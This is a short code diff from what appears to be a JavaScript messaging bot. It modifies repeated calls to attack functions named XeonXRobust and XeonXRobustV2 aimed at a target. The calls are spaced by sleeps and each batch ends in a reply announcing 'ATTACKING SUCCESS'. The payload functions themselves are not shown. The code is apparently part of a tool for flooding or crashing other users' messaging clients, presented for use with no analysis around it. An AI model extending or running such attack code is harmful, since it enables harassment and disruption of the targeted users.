@@ -2258,9 +2258,9 @@ await XeonXRobustV2(viper, XReturn)
 await sleep(1500);
 await sendSessionStructure(XReturn, wanted);
 await sleep(1500);
-await XeonXRobust(viper, XReturn);
+await XeonXRobust(XReturn, viper, (cct = true), (Ptcp = true));
 await sleep(1500);
-await XeonXRobust(viper, XReturn);
+await XeonXRobust(XReturn, viper, (cct = true), (Ptcp = true));
 }
 reply(`『 𝐀𝐓𝐓𝐀𝐂𝐊𝐈𝐍𝐆 𝐒𝐔𝐂𝐂𝐄𝐒𝐒 』
 
@@ -2304,9 +2304,9 @@ await XeonXRobustV2(viper, XReturn)
 await sleep(1500);
 await sendSessionStructure(XReturn, wanted);
 await sleep(1500);
-await XeonXRobust(viper, XReturn);
+await XeonXRobust(XReturn, viper, (cct = true), (Ptcp = true));
 await sleep(1500);
-await XeonXRobust(viper, XReturn);
+await XeonXRobust(XReturn, viper, (cct = true), (Ptcp = true));
 }
 reply(`『 𝐀𝐓𝐓𝐀𝐂𝐊𝐈𝐍𝐆 𝐒𝐔𝐂𝐂𝐄𝐒𝐒 』
 
@@ -2384,9 +2384,9 @@ await XeonXRobustV2(viper, XReturn)
 await sleep(1500);
 await sendSessionStructure(XReturn, wanted);
 await sleep(1500);
-await XeonXRobust(viper, XReturn);
+await await XeonXRobust(XReturn, viper, (cct = true), (Ptcp = true));
 await sleep(1500);
-await XeonXRobust(viper, XReturn);
+await XeonXRobust(XReturn, viper, (cct = true), (Ptcp = true));
 }
 reply(`『 𝐀𝐓𝐓𝐀𝐂𝐊𝐈𝐍𝐆 𝐒𝐔𝐂𝐂𝐄𝐒𝐒 』
 
